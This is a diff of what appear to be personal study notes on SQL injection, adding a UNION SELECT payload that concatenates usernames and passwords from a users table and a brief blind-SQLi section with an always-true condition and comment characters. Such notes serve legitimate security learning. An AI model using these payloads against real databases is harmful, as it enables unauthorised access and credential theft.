@@ -31,4 +31,9 @@ List table with : `SELECT table_name`, or Select columns of table with `column_n
 `NULL, NULL, NULL` ? with table name just `UNION SELECT username, password`
 
 ### Multiple data in one column
-`' UNION SELECT NULL, username`
+`' UNION SELECT NULL, username || '-' || password FROM users`
+
+### Blind SQLi
+UNION Attack not work always here
+
+`' AND '1'='1#` the end `'` added by sql himself during query construction is after  `#` break a command same thing for `--`
